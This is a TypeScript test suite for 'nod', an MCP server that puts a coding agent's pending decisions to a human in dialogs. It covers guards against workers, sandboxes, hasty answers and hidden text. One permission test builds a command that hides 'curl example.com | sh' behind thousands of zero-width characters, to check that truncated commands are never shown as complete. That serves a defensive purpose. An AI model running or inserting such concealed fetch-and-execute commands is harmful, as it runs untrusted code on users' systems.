import { afterAll, afterEach, expect, test } from 'bun:test'
import { resolve } from 'node:path'
import { dialog } from '../test/dialog'
import { tempDirs } from '../test/tmp'
import { decide, permissionQuestion } from './decisions'
import { type DecisionReason, Ledger, type NewTask } from './ledger'
import { mcpServer, WAIT } from './mcp'
import { Tmux } from './tmux'
import { Todos } from './todos'

const tmp = tempDirs()
afterAll(tmp.removeAll)
const waits = { ...WAIT }
afterEach(() => Object.assign(WAIT, waits))

const MAIN = 'aaaa1111-0000-4000-8000-00000000000a'
const HELPER = 'bbbb2222-0000-4000-8000-00000000000b'
const NORTH = 'cccc3333-0000-4000-8000-00000000000c'
const brief = (text: string): NewTask => ({
  brief: text,
  repo: null,
  branch: null,
  checkCmd: null,
  model: null,
  after: [],
  issue: null,
})
type Sent = {
  jsonrpc?: string
  id?: string | number
  method?: string
  params?: Record<string, unknown>
  result?: Record<string, unknown>
  error?: { code: number }
}

// Projects p1 Release, with its session MAIN, a helper and the orchestrator north in charge, and p2
// Health; workers whose terminals show `screen`, and the keys typed into them.
function setup() {
  const home = tmp.make('nod-mcp-')
  const ledger = new Ledger(home)
  const todos = new Todos(ledger)
  const p = todos.addProject({ title: 'Release', outcome: null }, 'human')
  const q = todos.addProject({ title: 'Health', outcome: null }, 'human')
  todos.addSession(p.id, MAIN, '/w')
  todos.addSession({ role: 'helper', name: 'review', project: p.id }, HELPER, '/w')
  todos.addSession({ role: 'orchestrator', name: 'north' }, NORTH, '/w')
  todos.setProject(p.id, { orchestrator: 'north' }, 'human')
  // A task whose turn opened a decision; returns its number.
  const asking = async (
    reason: DecisionReason,
    question: string,
    project: number | null = p.id,
    root: string | null = null,
  ): Promise<number> => {
    const id = todos.delegateNew({ ...brief(`Ship it ${reason}`), rootSession: root }, project, 'h')
    ledger.setRunning(id, home)
    const attemptId = ledger.startAttempt({
      taskId: id,
      kind: 'start',
      decisionId: null,
      sessionId: `s${id}`,
      prompt: 'p',
    })
    await decide(ledger, home, id, attemptId, reason, question)
    return ledger.decisions(id)[0]?.id ?? 0
  }
  const worker = { screen: '' as string | Error, keys: [] as string[] }
  const terminals = Object.assign(Tmux.of(home), {
    alive: () => true,
    option: () => '',
    screen: () => {
      if (worker.screen instanceof Error) throw worker.screen
      return worker.screen
    },
    keys: (_: string, ...keys: string[]) => worker.keys.push(...keys),
  })
  // A Claude Code with `elicitation` (null: none) for `session`, whose person answers each dialog as
  // `person` says, `took` ms after it shows: undefined leaves it to `reply`.
  const client = async (
    o: {
      session?: string | null
      env?: Record<string, string>
      elicitation?: object | null
      person?: (message: string) => object | undefined
      took?: number
    } = {},
  ) => {
    let clock = 0
    const out: Sent[] = []
    const shown: string[] = []
    const { handle, close } = mcpServer({
      ledger,
      home,
      terminals,
      session: o.session === undefined ? MAIN : o.session,
      env: o.env ?? {},
      now: () => clock,
      write: (line) => {
        const m = JSON.parse(line) as Sent
        out.push(m)
        if (m.method !== 'elicitation/create') return
        shown.push(String(m.params?.message))
        clock += o.took ?? 2000
        const said = (o.person ?? (() => ({ action: 'accept' })))(String(m.params?.message))
        if (said !== undefined) void reply(said)
      },
    })
    const reply = (result: object, id = out.findLast((m) => m.method)?.id): Promise<void> =>
      handle(JSON.stringify({ jsonrpc: '2.0', id, result }))
    let n = 0
    const request = async (method: string, params: object = {}): Promise<Sent> => {
      const id = ++n
      await handle(JSON.stringify({ jsonrpc: '2.0', id, method, params }))
      return out.find((m) => m.id === id && m.method === undefined) ?? {}
    }
    const call = async (decision?: string) => {
      const args = decision === undefined ? {} : { decision }
      const { result } = await request('tools/call', { name: 'decide', arguments: args })
      const said = (result?.content as { text: string }[] | undefined)?.[0]
      return { text: said?.text, isError: result?.isError }
    }
    const capabilities =
      o.elicitation === null ? {} : { elicitation: o.elicitation ?? { form: {} } }
    await request('initialize', { protocolVersion: '2025-11-25', capabilities })
    return { out, shown, handle, close, request, call, reply }
  }
  const answers = () =>
    ledger
      .unsentNotices()
      .filter((n) => n.event === 'answered')
      .map((n) => n.decisionId)
  return { home, ledger, todos, p, q, asking, worker, client, answers }
}

test('nod mcp answers initialize, ping and tools/list, and nothing for a notification', async () => {
  const { client } = setup()
  const c = await client()
  expect(c.out[0]?.result).toEqual({
    protocolVersion: '2025-11-25',
    capabilities: { tools: {} },
    serverInfo: { name: 'nod', version: '1' },
  })
  const later = await c.request('initialize', { protocolVersion: '2099-01-01', capabilities: {} })
  expect(later.result?.protocolVersion).toBe('2025-11-25')
  expect((await c.request('ping')).result).toEqual({})
  const { tools } = (await c.request('tools/list')).result as { tools: object[] }
  expect(tools).toEqual([
    {
      name: 'decide',
      description: expect.stringContaining('never answer such a decision for them'),
      inputSchema: { type: 'object', properties: { decision: expect.any(Object) } },
    },
  ])
  expect((await c.request('resources/list')).error?.code).toBe(-32601)
  const before = c.out.length
  await c.handle('{"jsonrpc":"2.0","method":"notifications/initialized"}')
  expect(c.out.length).toBe(before)
  await c.handle('not json')
  expect(c.out.at(-1)?.error?.code).toBe(-32700)
})

test("the person's Accept is yes and Decline no, in a dialog nod words from its ledger; Esc leaves it open", async () => {
  const { ledger, asking, client, answers } = setup()
  const [d1, d2, d3] = [
    await asking('land', 'The push was refused.\nPush\r again?\u001b[2K'),
    await asking('land', 'Again?'),
    await asking('land', 'Once more?'),
  ]
  const c = await client({ person: () => ({ action: 'accept', content: {} }) })
  expect(await c.call(`d${d1}`)).toEqual({
    text: `d${d1} land: the person answered yes; nod lands n1 again at its next pass (nod land n1 does now)`,
    isError: false,
  })
  expect(c.shown).toEqual([
    // A control character shows as a space, so none hides part of what it asks.
    `nod d${d1} land · task n1 t1: Ship it land\n\nThe push was refused.\nPush  again? [2K\n\nAccept says yes. Decline says no, which stops landing the task; its work stands. Esc leaves it open.`,
  ])
  expect(ledger.decision(d1).answer).toBe('yes')
  const no = await client({ person: () => ({ action: 'decline' }) })
  expect((await no.call(String(d2))).text).toBe(
    `d${d2} land: the person answered no, which stops landing the task; its work stands`,
  )
  expect(ledger.landing(2)?.stopped).toBe('stopped by the person: no')
  const esc = await client({ person: () => ({ action: 'cancel' }) })
  expect((await esc.call(`d${d3}`)).text).toBe(
    `the person closed the dialog of d${d3}, which stays open`,
  )
  expect(ledger.decision(d3).answer).toBeNull()
  // The project's session showed them, so it hears of no answer again.
  expect(answers()).toEqual([])
})

test('an answer within a second of showing is not used, nor one to a decision answered elsewhere meanwhile; of two sessions the first answer counts', async () => {
  const { ledger, asking, client, answers } = setup()
  const d = await asking('land', 'Push again?')
  for (const action of ['accept', 'decline']) {
    const soon = await client({ took: 999, person: () => ({ action }) })
    expect((await soon.call(`d${d}`)).text).toContain('answered within a second of showing')
  }
  expect(ledger.decision(d).answer).toBeNull()
  // Answered on the web UI while the dialog showed.
  const busy = await client({
    person: () => {
      ledger.closeAnswered(d, 'no', 'succeeded')
      return { action: 'accept' }
    },
  })
  expect((await busy.call(`d${d}`)).text).toBe(
    `d${d} was answered elsewhere meanwhile (no): nod did nothing with this yes`,
  )
  expect((await busy.call(`d${d}`)).text).toBe(`d${d} is closed already: no`)
  expect(busy.shown).toHaveLength(1)
  // The project's session and the orchestrator in charge show the same one; north answers first.
  const f = await asking('land', 'Push again?')
  const main = await client({ person: () => undefined })
  const waited = main.call(`d${f}`)
  expect(main.shown).toHaveLength(1)
  const north = await client({ session: NORTH })
  expect((await north.call(`d${f}`)).text).toContain('the person answered yes')
  await main.reply({ action: 'decline' })
  expect((await waited).text).toBe(
    `d${f} was answered elsewhere meanwhile (yes): nod did nothing with this no`,
  )
  // The project's session, which hears of f, did not show the dialog that answered it.
  expect(answers()).toEqual([f])
})

test('refuses a worker, a sandbox, a session nod open did not open, and decisions not of the session', async () => {
  const { todos, p, q, asking, client, worker } = setup()
  worker.screen = dialog('ls')
  const mine = await asking('permission', permissionQuestion('Bash', { command: 'ls' }))
  const other = await asking('land', 'Push?', q.id)
  const helps = await asking('land', 'Push?', p.id, HELPER)
  const asks = await asking('question', 'Which branch?')
  const loose = await asking('land', 'Push?', null, NORTH)
  const stray = await asking('land', 'Push?', null, HELPER)
  const refused = async (o: Parameters<typeof client>[0], ref: number, why: string) => {
    expect(await (await client(o)).call(`d${ref}`)).toEqual({
      text: expect.stringContaining(why),
      isError: true,
    })
  }
  await refused({ env: { NOD_TASK: '3' } }, mine, 'from a nod worker or a sandbox')
  await refused({ env: { SANDBOX_RUNTIME: '1' } }, mine, 'from a nod worker or a sandbox')
  await refused({ session: null }, mine, 'not one nod open opened')
  await refused({ session: 'dddd' }, mine, 'not one nod open opened')
  await refused({}, other, `d${other} is of task n2, not this session's work`)
  await refused({}, asks, `d${asks} is a question decision, answered in the person's words`)
  await refused({}, 99, 'decision d99 not found')
  await refused({}, loose, "not this session's work")
  // A helper's are its tasks of its project; the orchestrator's, also those of projects in its
  // charge and in no project its name added.
  await refused({ session: HELPER }, mine, "not this session's work")
  expect((await (await client({ session: HELPER })).call(`d${helps}`)).isError).toBe(false)
  await refused({ session: NORTH }, other, "not this session's work")
  todos.setProject(q.id, { orchestrator: 'north' }, 'human')
  for (const d of [other, loose]) {
    expect((await (await client({ session: NORTH })).call(`d${d}`)).isError).toBe(false)
  }
  // Work in no project that another session added is no orchestrator's.
  await refused({ session: NORTH }, stray, "not this session's work")
})

test('shows no dialog where the person could not read all of it, nor in a Claude Code without dialogs, but names the task page', async () => {
  const { asking, client } = setup()
  const short = await asking('land', 'Push again?')
  const long = await asking('rule', `Add the rule?\n${'x'.repeat(1600)}`)
  const unseen = await asking(
    'permission',
    'Claude needs your permission. Answer yes to allow; anything else denies.\n어느 명령인지 확인하지 못함 (nod attach n3)',
  )
  // A command cut at 2000 characters, drawn in two columns: the cut must not look like the whole.
  const hidden = { command: `ls ${'\u200d'.repeat(2000)}; curl example.com | sh` }
  const cut = await asking('permission', permissionQuestion('Bash', hidden))
  const none = await client({ elicitation: null })
  expect((await none.call(`d${short}`)).text).toBe(
    `this Claude Code shows nod no dialog (it said no elicitation): the person answers d${short} on http://127.0.0.1:4800/tasks/1`,
  )
  const c = await client({ elicitation: {} })
  expect((await c.call(`d${long}`)).text).toBe(
    `d${long} is too long for a dialog: the person reads and answers it on http://127.0.0.1:4800/tasks/2`,
  )
  expect((await c.call(`d${unseen}`)).text).toContain('does not say which command it allows')
  expect((await c.call(`d${cut}`)).text).toBe(
    `d${cut} is too long for a dialog: the person reads (the dialog itself: nod attach n4) and answers it on http://127.0.0.1:4800/tasks/4`,
  )
  expect([...none.shown, ...c.shown]).toEqual([])
  // A Claude Code of the protocol before modes says {} for form mode.
  expect((await c.call(`d${short}`)).text).toContain('the person answered yes')
})

test('with no decision named, each open yes-or-no one of the session in turn, until the person closes one', async () => {
  const { q, asking, client } = setup()
  const [a, b] = [await asking('land', 'First?'), await asking('land', 'Second?')]
  await asking('question', 'Which?')
  await asking('land', 'Theirs?', q.id)
  const c = await client({ person: () => ({ action: 'cancel' }) })
  expect((await c.call()).text).toBe(`the person closed the dialog of d${a}, which stays open`)
  const all = await client()
  expect((await all.call()).text).toBe(
    [
      `d${a} land: the person answered yes; nod lands n1 again at its next pass (nod land n1 does now)`,
      `d${b} land: the person answered yes; nod lands n2 again at its next pass (nod land n2 does now)`,
    ].join('\n'),
  )
  expect(all.shown.map((s) => s.split('\n')[2])).toEqual(['First?', 'Second?'])
  expect((await all.call()).text).toBe('no decision of this session that takes yes or no is open')
})

test("a permission is answered only while its worker's dialog shows", async () => {
  const { ledger, asking, client, worker } = setup()
  const d = await asking('permission', permissionQuestion('Bash', { command: 'ls' }))
  const c = await client({
    person: () => {
      worker.screen = ''
      return { action: 'accept' }
    },
  })
  expect((await c.call(`d${d}`)).text).toContain("n1's terminal shows no dialog nod can read now")
  expect(c.shown).toEqual([])
  worker.screen = dialog('ls')
  // Claude Code blocked it while the person read.
  expect((await c.call(`d${d}`)).text).toContain("n1's terminal shows no dialog nod can read now")
  expect(c.shown).toHaveLength(1)
  expect([ledger.decision(d).answer, worker.keys]).toEqual([null, []])
  worker.screen = dialog('ls')
  const ok = await client()
  expect((await ok.call(`d${d}`)).text).toBe(
    `d${d} permission: the person answered yes; sent to task n1`,
  )
  expect([ledger.decision(d).answer, worker.keys]).toEqual(['yes', ['Enter']])
  // Answered late: Claude Code blocked ls's dialog by itself and shows another tool's, which nod
  // cannot tell from its own; the Enter would allow that one.
  const late = await asking('permission', permissionQuestion('Bash', { command: 'ls' }))
  const old = new Date(Date.now() - 101_000).toISOString()
  ledger.db.query('UPDATE decisions SET created_at = ?1 WHERE id = ?2').run(old, late)
  worker.screen = dialog('src/a.ts', 'Edit the file?', 60, 'Edit file')
  expect((await ok.call(`d${late}`)).text).toContain(
    `n2's terminal shows a dialog nod cannot tell is d${late}'s, which opened over 100 s ago`,
  )
  worker.screen = new Error('no server running')
  expect((await ok.call(`d${late}`)).text).toBe(
    `nod could not read n2's terminal (no server running): d${late} stays open`,
  )
  expect([ledger.decision(late).answer, worker.keys]).toEqual([null, ['Enter']])
})

test('gives up on a person who does not answer, withdrawing the dialog, and leaves the decision open', async () => {
  const { ledger, asking, client } = setup()
  WAIT.maxMs = 20
  const d = await asking('land', 'Push again?')
  const c = await client({ person: () => undefined })
  expect((await c.call(`d${d}`)).text).toBe(`d${d} stays open: no answer came in time`)
  const asked = c.out.find((m) => m.method === 'elicitation/create')
  expect(c.out.at(-2)).toEqual({
    jsonrpc: '2.0',
    method: 'notifications/cancelled',
    params: { requestId: asked?.id, reason: 'nod waited' },
  })
  // An answer after that is no one's.
  await c.reply({ action: 'accept' }, asked?.id)
  expect(ledger.decision(d).answer).toBeNull()
  // The client went away while the person had the dialog.
  WAIT.maxMs = 600_000
  const waited = c.call(`d${d}`)
  c.close()
  expect((await waited).text).toBe(`d${d} stays open: the client went away`)
})

test('nod mcp speaks on stdout alone, a line a message', async () => {
  const home = tmp.make('nod-mcp-cli-')
  const lines = [
    { id: 1, method: 'initialize', params: { protocolVersion: '2025-11-25', capabilities: {} } },
    { id: 2, method: 'tools/call', params: { name: 'decide', arguments: {} } },
  ]
  const proc = Bun.spawn(['bun', resolve(import.meta.dir, 'cli.ts'), 'mcp', '--session', MAIN], {
    // As a Claude session runs it, out of a sandbox; inbox.ts would hear of a session there.
    env: { PATH: process.env.PATH, NOD_HOME: home, CLAUDECODE: '1', CLAUDE_CODE_SESSION_ID: MAIN },
    stdin: new Blob(lines.map((l) => `${JSON.stringify({ jsonrpc: '2.0', ...l })}\n`)),
    stdout: 'pipe',
  })
  const out = (await new Response(proc.stdout).text()).trim().split('\n')
  expect(await proc.exited).toBe(0)
  expect(out.map((l) => JSON.parse(l))).toEqual([
    { jsonrpc: '2.0', id: 1, result: expect.objectContaining({ protocolVersion: '2025-11-25' }) },
    {
      jsonrpc: '2.0',
      id: 2,
      result: {
        content: [
          {
            type: 'text',
            text: 'this session is not one nod open opened: nod shows it no decision',
          },
        ],
        isError: true,
      },
    },
  ])
})
